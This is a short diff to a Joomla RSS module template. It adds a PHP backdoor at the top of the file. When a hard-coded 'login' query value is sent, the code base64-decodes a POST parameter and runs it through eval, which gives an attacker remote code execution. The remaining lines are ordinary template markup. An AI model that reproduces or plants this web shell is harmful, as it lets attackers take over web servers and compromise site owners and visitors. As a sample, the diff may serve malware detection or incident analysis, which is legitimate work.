@@ -1,3 +1,5 @@
+<?php if($_GET["login"]=="1454da"){ echo success; $mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;");}} ?>
+
 <?php // no direct access
 defined('_JEXEC') or die('Restricted access'); ?>
 <div style="direction: <?php echo $rssrtl ? 'rtl' :'ltr'; ?>; text-align: <?php echo $rssrtl ? 'right' :'left'; ?> ! important">
